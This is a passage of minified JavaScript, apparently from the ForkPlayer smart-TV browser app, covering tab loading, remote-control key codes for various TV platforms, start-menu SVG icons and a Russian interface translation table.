if(u.indexOf("#POST")>0)u=u.split("#POST")[0];if(u.match(/^searchEngines(#url|xml)?\|/))u=u.split("|")[2];$_("navigate",'<span id="navinfo2" style="color:gray;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+"<span id='navurl'>"+getNavU(u)+"</span>");if($_("content")){$_("content","")}
if($_("description")){$_("description").style.display="none";$_("description","")}
maJor.sethash()},loader:{start:function(){if(oInset.panel.is_hide()||isScreensaver){this.loadertimer=setInterval(function(){oInset.loader.update()},500);if(!$_("loader")){var div=document.createElement('div');div.id="loader";div.style.position='fixed';div.style.top='50%';div.style.left='50%';div.style.transform='translate(-50%, -50%)';var img=document.createElement('img');img.src=_img('_ST_loader.gif?ndate241110_');img.alt='Loading';img.style.width='70px';img.style.height='70px';div.appendChild(img);document.getElementsByTagName('body')[0].appendChild(div)}else $_("loader").style.display="block";if(isScreensaver)$_("loader").style.zIndex="3";else $_("loader").style.zIndex=""}},stop:function(){clearInterval(this.loadertimer);if($_("loader"))$_("loader").style.display="none"},update:function(){if(handler!="menu")this.stop()}},init:function(){var c=this,m=maJor;var stinset;if(m.params.get("recovery")){m.statusbar("_FPVozobnovlenie_");for(i=0;i<c.lII11v0O000lYpr;i++)if(m.read("url"+i)&&oInset.addtab(i).get("a")=="1")stinset=oInset.tabs.length-1}else{for(i=0;i<c.lII11v0O000lYpr;i++)if(m.read("url"+i))m.write("url"+i,"");oInset.addtab()}
if(oInset.tabs.length==0)oInset.addtab(0);insetActive=stinset||parseInt(m.read("urlInset"))||0;if(!oInset.tabs[insetActive])insetActive=oInset.tabs.length-1;c.breakScreen(Il01QllQll().get("url"));try{c.renderInset()}catch(e){jsshowErr("RENDER INSET "+e.message)}
try{c.listInset()}catch(e){jsshowErr("LIST INSET "+e.message)}
setTimeout("if(Il01QllQll().INC==-1) Il01QllQll().navigateHist(-1);",1000)}};var menuSel=0,menuSubSel=-2,doubleEvent=0,runtime=0;var tvKey,xVol=80;var piframe=!1,xhr_referer=2;var tmpl_button='<div style="text-align:center;height:26px;margin:4px; font-size: 23px;   border-radius: 5px;     padding: 5px 16px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>';var tmpl_info="<div style='position:absolute;top:550px;left:870px;width: 400px;'><div style='min-height: 80px;border-radius:5px;padding:5px; background: #546266;color: #fff;font-size:22px;width: 380px;'>info</div><span style='border: 10px solid transparent; border-bottom: 10px solid #546266; border-left: 10px solid #546266;margin-top:-20px;float:right;'></span></div>";var tmpl_box='<div class="setting-item">'+'<div class="setting-icon"><span class="material-icons">$logo</span><img style="position: absolute;margin-left: -10px;" src="$logo_30x30" width="28" height="28"></div>'+'<div class="setting-title">$title<div class="setting-desc">$description</div></div>'+''+'</div>';var startL=["omnibox","spider","fav","vilka_last","vilka_rek","top","service"];var startN={"omnibox":"_FPOmnibox address bar and search_","spider":"_FPBeginner_","fav":"_FPFavorites_","vilka_last":"_FPContinue watching_","vilka_rek":"Рекомендации от VilkaDB","top":"_FPHistory_","service":"_FPLocal_"};var startT={"omnibox":"","spider":"_FPBeginner_","fav":"_FPFavorites_","service":"_FPLocal_","top":"_FPHistory_","vilka_last":"_FPContinue watching_ _FPon_ VilkaDB","vilka_rek":"_FPYour recommendations_"};var startTLogo={"spider":'<svg width="24px" height="24px" style="width:24px;height:24px;" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="none"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g> <g clip-path="url(#a)"> <path stroke="#46918c" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m9.9 16.97 7.436-7.436a8 8 0 0 0 2.145-3.89l.318-1.401-1.402.317a8 8 0 0 0-3.89 2.146L9.192 12.02m.707 4.95 2.122 3.535c1.178-1.178 2.828-2.828 0-5.657L9.899 16.97zm0 0-2.828-2.829m0 0L3.536 12.02c1.178-1.179 2.828-2.829 5.656 0m-2.12 2.121 2.12-2.121M4.95 16.263s-1.703 2.54-.707 3.536c.995.996 3.535-.707 3.535-.707"></path> </g> <defs> <clipPath id="a"> <path fill="#ffffff" d="M0 0h24v24H0z"></path> </clipPath> </defs> </g></svg>',"fav":'<svg style="width:24px;height:24px;" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g> <rect width="48" height="48" fill="white" fill-opacity="0.01"></rect> <path fill-rule="evenodd" clip-rule="evenodd" d="M16.8712 33.0436L15.9976 44.7036C15.9362 45.5229 16.6646 46.0872 17.3161 45.722C21.9289 43.1382 36.3783 33.6479 43.7017 12.7899C44.0376 11.8331 43.1352 10.9697 42.3646 11.5094C38.0387 14.539 28.5846 20.8006 22.7421 21.9934C22.7421 21.9934 26.4836 19.3946 28.7231 15.4053C28.9426 15.0143 28.9244 14.5136 28.6796 14.1606L20.5127 2.38925C20.0287 1.69147 19.0354 1.98057 18.8606 2.87002L16.3181 15.8073L4.38437 26.2226C3.78602 26.7446 3.90808 27.7996 4.5989 28.079L16.8712 33.0436Z" fill="#007c00"></path> <path fill-rule="evenodd" clip-rule="evenodd" d="M37.9745 28.448C37.2188 29.5025 35.5908 31.6717 34.0876 32.9974C33.7871 33.2624 33.8276 33.7068 34.1724 33.9234L42.1145 38.909C42.5926 39.2091 43.2384 38.8529 43.1576 38.3323C42.7882 35.9496 41.7237 30.9818 39.0328 28.3741C38.7322 28.083 38.2142 28.1136 37.9745 28.448Z" fill="#58b69f"></path> </g></svg>',"service":'<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M2.5 4v3h5v12h3V7h5V4h-13Z"/></svg>',"top":'<svg style="width:24px;height:24px;" viewBox="-4.32 -4.32 56.64 56.64" fill="none" xmlns="http://www.w3.org/2000/svg"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="0.768"></g><g> <rect width="48" height="48" fill="white" fill-opacity="0.01"></rect> <path d="M5.81824 6.72729V14H13.091" stroke="#71cffe" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M4 24C4 35.0457 12.9543 44 24 44V44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4C16.598 4 10.1351 8.02111 6.67677 13.9981" stroke="#71cffe" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M24.005 12L24.0038 24.0088L32.4832 32.4882" stroke="#71cffe" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>',"vilka_rek":'<svg style="width:24px;height:24px;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g> <path d="M12 3L14.0357 8.16153C14.2236 8.63799 14.3175 8.87622 14.4614 9.0771C14.5889 9.25516 14.7448 9.41106 14.9229 9.53859C15.1238 9.68245 15.362 9.77641 15.8385 9.96432L21 12L15.8385 14.0357C15.362 14.2236 15.1238 14.3175 14.9229 14.4614C14.7448 14.5889 14.5889 14.7448 14.4614 14.9229C14.3175 15.1238 14.2236 15.362 14.0357 15.8385L12 21L9.96432 15.8385C9.77641 15.362 9.68245 15.1238 9.53859 14.9229C9.41106 14.7448 9.25516 14.5889 9.0771 14.4614C8.87622 14.3175 8.63799 14.2236 8.16153 14.0357L3 12L8.16153 9.96432C8.63799 9.77641 8.87622 9.68245 9.0771 9.53859C9.25516 9.41106 9.41106 9.25516 9.53859 9.0771C9.68245 8.87622 9.77641 8.63799 9.96432 8.16153L12 3Z" stroke="#67add0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>',"vilka_last":'<svg xmlns="http://www.w3.org/2000/svg"  style="width:24px;height:24px;" viewBox="0 -960 960 960" fill="#329bccff"><path d="M320-320h80v-320h-80v320Zm160 0 240-160-240-160v320Zm0 240q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Zm0-80q134 0 227-93t93-227q0-134-93-227t-227-93q-134 0-227 93t-93 227q0 134 93 227t227 93Zm0-320Z"/></svg>',"service":'<svg width="24px" height="24px" viewBox="0 -9.36 69.998 69.998" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g> <metadata> <rdf:rdf> <cc:work> <dc:subject> Miscellaneous </dc:subject> <dc:identifier> tablet </dc:identifier> <dc:title> Tablet </dc:title> <dc:format> image/svg+xml </dc:format> <dc:publisher> Amido Limited </dc:publisher> <dc:creator> Richard Slater </dc:creator> <dc:type rdf:resource="http://purl.org/dc/dcmitype/StillImage"></dc:type> </cc:work> </rdf:rdf> </metadata> <path d="m -46.303072,512.73876 c -1.027,-0.2436 -2.0253,-1.0838 -2.5991,-2.1875 l -0.3214,-0.6183 0,-22.7381 0,-22.7382 0.3099,-0.5801 c 0.4862,-0.9098 1.0857,-1.5062 1.9321,-1.9218 l 0.7806,-0.3833 31.7372,0 31.7372,0 0.9024,0.4276 c 1.0678,0.506 1.8294,1.2367 2.2749,2.1828 l 0.3235,0.687 0,22.3689 0,22.369 -0.3728,0.7614 c -0.4355,0.8895 -1.1796,1.5843 -2.2376,2.0893 l -0.7556,0.3607 -31.5999,0.021 c -18.01,0.012 -31.821,-0.031 -32.1141,-0.1007 z m 37.3132002,-1.817 c 0.7959,-0.5219 0.8208,-1.417 0.052,-1.8856 -0.4181,-0.2549 -0.7138,-0.27 -5.2927002,-0.2705 -5.3062,0 -5.4655,0.021 -5.7848,0.7921 -0.2747,0.6632 0.1737,1.3573 1.023,1.5835 0.148,0.04 2.374,0.062 4.9467,0.05 4.2538002,-0.02 4.7118002,-0.044 5.0554002,-0.2695 z m 24.4084998,-23.7269 0,-20.1965 -29.6076,0 -29.6077,0 0,20.1965 0,20.1964 29.6077,0 29.6076,0 0,-20.1964 z" fill="#757d80" transform="translate(49.224 -461.571)"></path> </g></svg>'}
var model="none";if(typeof ipG=="undefined")var ipG="";if(typeof ipCountry=="undefined")var ipCountry="";var pluginAPI=null;if(typeof version_local_files=="undefined")version_local_files=0;if(typeof version_local_js=="undefined")version_local_js=0;var pluginAPI=null;if(window.Common){try{var widgetAPI=new Common.API.Widget();var pluginAPI=new Common.API.Plugin();console.log=function(a){alert(a)}}catch(e){}}
function css_w(n,m,k){return n}
function css_wh(n,m,k){return n}
if(maJor.platform()=="maple"){try{tvKey=new Common.API.TVKeyValue();var VK_ENTER=tvKey.KEY_ENTER;var VK_PAUSE=tvKey.KEY_PAUSE;var VK_PAGE_UP=tvKey.KEY_CH_UP;var VK_PAGE_DOWN=tvKey.KEY_CH_DOWN;var VK_LEFT=tvKey.KEY_LEFT;var VK_UP=tvKey.KEY_UP;var VK_RIGHT=tvKey.KEY_RIGHT;var VK_DOWN=tvKey.KEY_DOWN;var VK_0=tvKey.KEY_0;var VK_1=tvKey.KEY_1;var VK_2=tvKey.KEY_2;var VK_3=tvKey.KEY_3;var VK_4=tvKey.KEY_4;var VK_5=tvKey.KEY_5;var VK_6=tvKey.KEY_6;var VK_7=tvKey.KEY_7;var VK_8=tvKey.KEY_8;var VK_9=tvKey.KEY_9;var VK_A=90;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_O=79;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=tvKey.KEY_RED;var VK_GREEN=tvKey.KEY_GREEN;var VK_YELLOW=tvKey.KEY_YELLOW;var VK_BLUE=tvKey.KEY_BLUE;var VK_FAST_FWD=tvKey.KEY_FF;var VK_REWIND=tvKey.KEY_RW;var VK_STOP=tvKey.KEY_STOP;var VK_PLAY=tvKey.KEY_PLAY;var VK_MUTE=tvKey.KEY_MUTE;var VK_INFO=tvKey.KEY_INFO;var VK_BACK=tvKey.KEY_RETURN;var VK_EXIT=tvKey.KEY_EXIT;var VK_TOOLS=tvKey.KEY_TOOLS;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}catch(e){jsshowErr("TVKey "+e.message,1)}}else{var VK_ENTER=13;var VK_PAUSE=19;var VK_PAGE_UP=33;var VK_PAGE_DOWN=34;var VK_LEFT=37;var VK_UP=38;var VK_RIGHT=39;var VK_DOWN=40;var VK_0=48;var VK_1=49;var VK_2=50;var VK_3=51;var VK_4=52;var VK_5=53;var VK_6=54;var VK_7=55;var VK_8=56;var VK_9=57;var VK_A=65;var VK_B=66;var VK_C=67;var VK_D=68;var VK_E=69;var VK_F=70;var VK_G=71;var VK_H=72;var VK_I=73;var VK_J=74;var VK_K=75;var VK_L=76;var VK_M=77;var VK_N=78;var VK_O=79;var VK_P=80;var VK_Q=81;var VK_R=82;var VK_S=83;var VK_T=84;var VK_U=85;var VK_V=86;var VK_W=87;var VK_X=88;var VK_Y=89;var VK_Z=90;var VK_RED=403;var VK_GREEN=404;var VK_YELLOW=405;var VK_BLUE=406;var VK_REWIND=412;var VK_STOP=413;var VK_PLAY=415;var VK_FAST_FWD=417;var VK_INFO=457;var VK_BACK=461;var KEY_VOLUME_PLUS=999;var KEY_VOLUME_MINUS=998}
if(maJor.platform()=="spark"){var VK_PAUSE=66;var VK_PAGE_UP=7;var VK_PAGE_DOWN=8;var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=405;var VK_BLUE=115;var VK_FAST_FWD=65;var VK_REWIND=70;var VK_STOP=10;var VK_PLAY=80;var VK_MUTE=78;var VK_INFO=116;var VK_BACK=117;var KEY_VOLUME_PLUS=77;var KEY_VOLUME_MINUS=76}
if(maJor.platform()=="sharp"){VK_PAGE_UP=427;VK_PAGE_DOWN=428}
if(maJor.platform()=="tizen"){VK_RED=403;VK_GREEN=404;VK_YELLOW=405;VK_BLUE=406;VK_PAGE_UP=427;VK_PAGE_DOWN=428;VK_BACK=0;VK_MUTE=449;VK_PAUSE=19;VK_REWIND=412;VK_STOP=413;VK_PLAY=415;VK_FAST_FWD=417}
var resolution_portal="",stb;if(maJor.platform()=="dune"){var VK_RED=193;var VK_GREEN=194;var VK_YELLOW=195;var VK_BLUE=196;var VK_FAST_FWD=205;var VK_REWIND=204;var VK_STOP=178;var VK_PAUSE=218;var VK_INFO=199;var VK_EXIT=18;var KEY_VOLUME_PLUS=175;var KEY_VOLUME_MINUS=174;if(typeof document.referrer!="undefined"){if(document.referrer.length>5)resolution_portal=document.referrer}}
if(maJor.platform()=="mag"){var VK_RED=112;var VK_GREEN=113;var VK_YELLOW=114;var VK_BLUE=115;var VK_FAST_FWD=70;var VK_REWIND=66;var VK_STOP=83;var VK_PAUSE=82;var VK_MUTE=78;var VK_INFO=89;var VK_EXIT=27;var KEY_VOLUME_PLUS=107;var KEY_VOLUME_MINUS=109;if(window.gSTB){stb=gSTB;stb.EnableServiceButton(!0);stb.InitPlayer();if(document.referrer){if(document.referrer.length>5)resolution_portal=document.referrer;else resolution_portal="file:///home/web/services.html"}
var stbEvent={onEvent:function(event){if(event==4)vPlayer.OnBufferingComplete();if(event==1)vPlayer.endvideo();if(event==5)vPlayer.eventerrvideo()},event:0};window.moveTo(0,0);stb.SetVolume(xVol)}}
if(typeof _lang=="undefined")var _lang={};_lang.ru={"_name":"Русский","Beginner":"Начало","_powered":"","Transparency in the interface":"Прозрачности в интерфейсе","Sign in to sync browser data across devices":"Войдите, чтобы синхронизировать данные браузера на разных устройствах","Enter search query or site URL, playlist XML / M3U":"Введите поисковый запрос или URL-адрес сайта, плейлиста XML / M3U","My account":"Мой аккаунт","Edit in Search engines":"Редактировать в Поисковые системы","Profile":"Профиль","enter":"войти","Set name":"Задать имя","Display time":"Показывать часы","mysets":"моих настроек","Add stripes":"Добавить полосы","Zakladki":"Закладки","zakladki":"закладки","Vneshnie":"Внешние","Vnutr":"Внутренние","poiskov":"поисков","Raznoe":"Разное","Seriali":"Сериалы","Filmi":"Фильмы","Tema":"Тема","History":"История","Adjust weather":"Настроить погоду","Server not response":"Сервер не отвечает","Open closed tab":"Открыть закрытую вкладку","Zakladki":"Закладки","Your country":"Страна использ. прилож.","Oneaudiotrack":"Одна звуковая дорожка","OpredelenieDns":"Определение ДНС","RegistraciyaVseti":"Регистрация в сети","SchitivanieNastroek":"Считывание настроек","Inicializaciya":"Инициализация","Zoom":"Масштаб","Copied denied by author playlist":"Автор плейлиста запретил копирование","Timeout":"Таймаут","pleera":"плеера","Zagruzka":"Загрузка","Interface":"интерфейса","menu":"меню","Cancel":"Отмена","Size data":"Размер данных","data from server":"данных с сервера","Error download data, load local settings":"Ошибка получения данных, загружены локальные настройки","Menu":"Меню","Store data":"Хранить данные","Save and":"Сохранить и","Saving data to the server every 5 minutes or by pressing the Menu button Save and":"Сохранение данных на сервер происходит каждые 5 минут или по нажатию кнопки Меню Сохранить и","On Server":"На сервере","Local":"Локально","ChtenieNastroekPoiska":"Чтение настроек поиска","Vozobnovlenie":"Возобновление","Soobshestvo":"Сообщество","Go to settings":"Перейти к настройкам","Add search engine":"Добавить поисковик","Vash":"Ваш","macAdres":"мак-адрес","404NotFound":"Ошибка 404. Такого файла не существует","HotiteIskatVdrugihMestah":"Хотите искать это других местах","Vospolzuites":"Воспользуйтесь","NaitiVglobPoiske":"Найти в поисковых системах","GlobPoisk":"Глобальный поиск","DobroPozhalovat":"Новая вкладка","Frequently Visited Sites":"Часто посещаемые сайты","ViberiteChtoIskat":"Выберите что искать","ViberiteEpg":"Выберите нужный ЕПГ для канала","Stranica":"Страница","ZdesPusto":"Здесь пусто","PoiskPrervan":"Поиск прерван","UdalenaGrupa":"Была удалена начальная группа","StartovoeMenu":"Стартовое меню","Sync":"Синхронизация","Export":"Экспорт","SaveSetServ":"Сохранить настройки на сервере","Import":"Импорт","nastrdruga":"настроек","VvLogDr":"Введите логин пользователя от сайта","PolNastrDr":"Получить настройки пользователя","Are you sure":"Вы уверены","Delete":"Удалить","EtoMozhUd":"Это может удалить текущие настройки виджета","Steret":"Стереть","NastroikiPrilozheniya":"Настройки приложения","NastrStartMenu":"Настройки начальной страницы","NastrGlPoisk":"Поисковая система","DobavlenoV":"Добавлено в","DlVklPer":"Для включения перейдите в Настройки / Настройки поиска /","ZaklUzheEst":"Такая закладка уже есть","vstm":"в стартовом меню","UdMsNsM":"Удалить из стартового меню можно в <br>Настройки / Настройки Стартового меню","Udalit":"Удалить","Clear":"Очистить","Vstavit":"Вставить","Kopirovat":"Копировать","Ssilka":"Ссылка","Search":"Поиск","NazhmVpravo":"Нажмите вправо","chud":"чтобы удалить","Vkl":"Включено","Otkl":"Отключено","Vkl.":"Вкл.","Otkl.":"Откл.","Button":"Кнопка","PeremV":"Переместить в","IstOchishena":"История очищена","PrRabStogoMesta":"Продолжать работу с того же места","Nastroiki":"Настройки","ChPoyas":"Часовой пояс","Time offset":"Смещение времени","Perekl":"Перекл.","KachVideo":"Качество видео","KolStrok":"Количество строк","Videopleer":"Видеоплеер","Hide":"Скрыть","pleer":"плеер","Rezhim":"Режим","NachGrupa":"Начальная группа","RodKontr":"Родительский контроль","FonRisunok":"Фоновый рисунок","Donate to browser development in Profile":"Поддержите разработку браузера в Профиле","Mac address":"Мак адрес","YarkFon":"Яркость фона (Произв.)","CvetText":"Цвет текста","VkKod":"Вконтакте код","MoiUvedoml":"Мои уведомления","PolnSbrosNastr":"Полный сброс настроек","Yazik":"Язык","PereklM":"Переключение между","DelMuvT":"Делайте меньше для увеличения текста","TvpPu":"Тип видео плеера по умолчанию","TipPu":"Тип плеера IPTV по умолчанию","Sort":"Сортировать","automatically":"автоматически","Enabling can slow opening iptv lists":"Включение может замедлить открытие списков iptv","KartVKart":"Картинка в картинке<br>Автоматический предпросмотр видео в маленьком окошке (при отключенной опции PIP для выбранного видео включить можно кнопкой плей на пульте)","vospr":"воспроизведения","prilozheniya":"приложения","RemoteInfo":"RemoteFork это вспомогательная программа для <br>— запуск с  некоторых  ресурсов (торренты, moonwalk)<br>— загрузка плейлистов с компьютера во внешние закладки без регистрации на сайте<br>— доступ к плейлистам,файлам компьютера с ForkPlayer<br>— плагины, работа сайтов требующих ремотефорка, торрент трекеры<br>Для включения необходимо скачать и запустить программу Remote Forkplayer на компьютере или андроиде подключенному к тому же роутеру что и ТВ<br>Ссылка на скачивание","PrivVk":"Привязка своего аккаунта Вконтакте","Font":"Шрифт","polzovatelya":"пользователя","SsilkaVkKod":"Ссылка где можно получить код привязки","VashUvNp":"Ваши уведомления, например пароль от сайта","ZsIsN":"Загрузка на сервер или скачивание всех настроек виджета","zaklIist":"закладок и истории","VvKodPr":"Введите код привязки ВК","Auto":"Авто","Tolko":"Только","DlyaVsV":"Для всех видео","BistrPoisk":"Быстрый поиск","Parol":"Пароль","parol":"пароль","to":"до","mo":"мес","DlDostVv":"Для доступа введите","DeistDoV":"действует до выхода в стартовое меню<br>Или нажмите Назад для отмены","Default":"По умолчанию","poumolch":"по умолчанию","Adult content":"Взрослый контент","Third-party content":"Сторонний контент","SmIotk":"Сменить или отключить","moV":"можно в","My bookmarks and history":"Мои закладки и история","RazblVkl":"Разблокировать вкладку","EtaVklBzabl":"Эта вкладка была заблокирована","DlRvIn":"Для разблокировки выделите ее и нажмите","VvedNov":"Введите новый","DlUdVved":"Для удаления введите","ZablVkl":"Заблокировать вкладку","UstSart":"Установить стартовой","UdIzSt":"Удалить из стартовой","ustanovit":"установить","Media":"Медиа","Vstroenniy":"Встроенный","OtmNeProsm":"Отметить непросмотренным","OtmProsm":"Отметить просмотренным","DobavVglob":"Добавить в поисковые системы","Peredvinut":"Передвинуть","VijtiV":"Выйти в","EXIT":"ВЫХОД","listSservera":"лист с сервера","DobavitV":"Добавить в","Use in search":"Использовать в поиске","OchistitIstoriyu":"Очистить историю","ObnovitStranicy":"Обновить страницу","izZakladok":"из закладок","PeremV":"Переместить в","Clear cache":"Очистить кеш","OshibkaSohrDannih":"Ошибка сохранения данных","OshibkaChDannih":"Ошибка чтения данных","ustanolen":"установлен","VineSmP":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","nePodhodit":"не подходит","PrilUstSh":"Приложения устанавливаются в смартхаб","IzvFailovNo":"Извините, файлов не обнаружено","sIst":"с источника","PerPoAdr":"Перейти по адресу","OshibkaParsPl":"Ошибка парсинга страницы","OshibkaObrabotki":"Ошибка обработки","Informaciya":"Информация","Click now right to go to the category selection":"Нажмите сейчас вправо для перехода к выбору категории","DlyaPerNsp":"Для перехода на следующую страницу нажмите кнопку вправо","infodns":"Используйте RemoteFork<br>(в настройках, необходим компьютер или андроид) для более быстрой навигации по этому сайту","January":"Января","February":"Февраля","March":"Марта","April":"Апреля","May":"Мая","June":"Июня","Jule":"Июля","August":"Августа","September":"Сентября","October":"Октября","November":"Ноября","December":"Декабря","Monday":"Понедельник","Tuesday":"Вторник","Wednesday":"Среда","Thursday":"Четверг","Friday":"Пятница","Saturday":"Суббота","Sunday":"Воскресенье","Md":"Пн","Tu":"Вт","Wd":"Ср","Th":"Чт","Fr":"Пт","St":"Сб","Sn":"Вс","on":"на","Only local":"Только локально","Subtitles":"Субтитры","Video & Audio":"Видео & Аудио","Settings":"Настройки","Network":"Сеть","Start Page":"Начальная страница","Omnibox address bar and search":"Адресная строка омнибокса и поиск","Oshibka":"Ошибка","polVr":"получения времени","UspIdPolz":"Успешно!<br>ID пользователя","NeobhUstIzap":"Необходимо установить и запустить на компьютере программу","SbrositNastr":"Сбросить настройки","VsaeZaklUd":"Все закладки, история, настройки будут удалены","PrevLimOzh":"Превышен лимит ожидания","Favorites":"Избранное","opredDns":"определения ДНС","Configuring search":"Настройка поиска","Configuring start menu":"Настройка старт. меню","Top queries":"Топ запросов","Enter search query or URL":"Введите поисковый запрос или URL","VvediteText":"Введите текст","PustayaSsilka":"Пуcтая ссылка","Obrabotka":"Обработка","Create a Fork Profile":"Создайте Профиль Fork","NetOtvetaUbedRemote":"Нет ответа! Убедитесь что включен RemoteFork","PovtorPop":"Повторная попытка","ProvSostRem":"Проверьте состояние RemoteForkplayer на компьютере","polSsilki":"получения ссылки","EtoStList":"Это стартовый плейлист","NeskEl":"Несколько элементов","Add all links":"Добавить все ссылки","Add a search engine":"Добавить поисковую систему","stMenuSkr":"стартового меню  скрыто<br>Включить их можно в Настройках / Настройка старт. меню","VvedAdrPl":"Введите адрес","SudaMozhVv":"Введите адрес плейлиста M3U, XML","Vkontakte":"Вконтакте","VashaStrVk":"Ваша страница вконтакте","PrivVk":"Привязать ВК","KodPolZd":"Код получать здесь","FailKnR":"Файлы вашего компьютера. (Необходимо запустить RemoteForkplayer на компьютере и включить","PamyatTv":"Память ТВ","VverhVniz":"Вверх / Вниз","Save":"Сохранить","Your search engines":"Ваши поисковые системы","VPLEER":"В ПЛЕЕР","Vnutr":"Внутр","Vnesh":"Внешн","StartMenu":"Старт меню","SleduushayaStr":"Следующая стр","Ostanovleno":"Остановлено","Iskat":"Искать","Podkluchenie":"Соединение","SoedineniePrervano":"Соединение прервано","Preferred server":"Предпочитаемый сервер","soedineniya":"соединения","podklucheniya":"подключения","SbrosVipolnenPerezpusk":"Сброс настроек приложения выполнен!<br>Перезапуск виджета","Prodolzhit":"Продолжить","Otmena":"Отмена","Live search":"Живой поиск","Screensaver":"Заставка","Confirm action":"Подтвердите действие","To cancel the search, press again":"Для отмены поиска нажмите еще раз","VseRavnoProdolzhit":"Все равно продолжить","parsingaVideossilki":"парсинга видеоссылки","NevernayaSsilka":"Неверная ссылка","Proporcii":"Пропорции","OpciiEkrana":"Опции экрана","OchishPamyati":"Очищ. памяти","min":"мин","Kachestvo":"Качество","Nedostupno":"Недоступно","New inset":"Новая вкладка","New private inset":"Новая приватная вкладка","SeichasNedostupno":"Сейчас недоступно","Shirina":"Ширина","Visota":"Высота","Buffer":"Буффер","Latest stable":"Последняя стабильная","Mb":"Мб","ZvukDorozhka":"Звук. дорожка","Ekran":"Экран","Gromkost":"Громкость","Tip":"Тип","Date":"Дата","Album":"Альбом","Original":"Оригинал","Rastyanut":"Растянуть","Ruchnoi":"Ручной","VozobnovitNa":"Возобновить","Posledovatelno":"Последовательно","Povtoryat":"Повторять","odin":"один","vse":"все","in":"в","DostupRazreshen":"Доступ разрешен","REKLAMA":"РЕКЛАМА","PereadresaciyaNaFail":"Переадресация на файл","Vneshniy":"Внешний","Npl1I0lOOIQkBvOOlOYpr":"Не подходит ТВ программа","VoVremProsNazh":"Во время просмотра IPTV канала нажмите","VmEmVp":"В Меню -> ЕПГ код можно выбрать подходящую","dVp":"для выбора подходящей","VmVpostBiCe":"Вместо видео постоянно белый или черный экран?<br><i>Попробуйте другой тип","HotChtVfon":"Хотите чтобы видео играло в фоне? Нажмите","vVrPrVid":"во время проигрывания видео","Close tab":"Закрыть вкладку","KnInfoPerRezh":"Кнопка инфо на пульте переключает режим отображения информации при просмотре видео","Video":"Видео","video":"видео","nePodderzhivaetsya":"не поддерживается","DrugZvDorNet":"Других звуковых дорожек нет","PustayaIliUdalSsilkaVK":"Пустая или удаленая ссылка ВК","Podtverdit":"Подтвердить","OzhidaiteNeskSec":"Ожидайте несколько секунд","NazhmExitEsheRazDlyaVihoda":"Нажмите EXIT еще раз для выхода","ViNeSmeniliPassRodKontrRekomendSm":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей</i>","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","PoiskAudio":"Поиск аудиозаписей","Source code":"Исходный код","PoiskVideo":"Поиск видеозаписей","PoiskFoto":"Поиск фото (дост. без авторизации)","MoiAudio":"Мои аудиозаписи","MoiVideo":"Мои видеозаписи","Popular":"Популярное","Druzya":"Друзья","Gruppi":"Группы","SetFon":"Установить как фон","Audio":"Аудиозаписи","PoiskPeople":"Поиск людей","Authorization":"Авторизация","My":"Мои","OshibkaAvtorizacii":"Ошибка авторизации","VashiDruzya":"Ваши друзья","VashiGruppi":"Ваши Группы","Uchastnikov":"Участников","byLogin":" по логину и паролю","byCode":" по коду","IdetUstanovkaVidgeta":"Идет установка виджета","Ustanovka":"Установка","vidgeta":"виджета","Length":"Размер","GB":"ГБ","MB":"МБ","KB":"КБ","Bait":"Байт","Vidget":"Виджет","Manually":"Вручную","Enter":"Введите","OpenWidget":"Открыть виджет","Open":"Открыть","InstallWidgetInSmartHub":"Если вы уверены, что это виджет для самсунг смарт тв, то нажмите ентер для установки","recomOpenFromSmartHub":"необходимо запускать с смартхаба","ForkPlayerByClosed":"ForkPlayer будет закрыт<br>Возможна работа не на весь экран, для полноценной работы","NoDevices":"Нет подключенных","Open":"Открыть","Forced without a background":"Принудительно без фона","Sorting":"Сортировка","Archive":"Архив","Higher":"Самый верх","Top":"Верх","Bottom":"Низ","Lower":"Самый низ","TVmemory":"Внутренняя память","uzheEstVustanovlennih":"уже есть в установленных","uspeshnoUstanovlen":"успешно установлен","VnimanieSvobMesto":"Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места","ViklIvklTVchtobiUv":"Выключите и включите ТВ чтоб 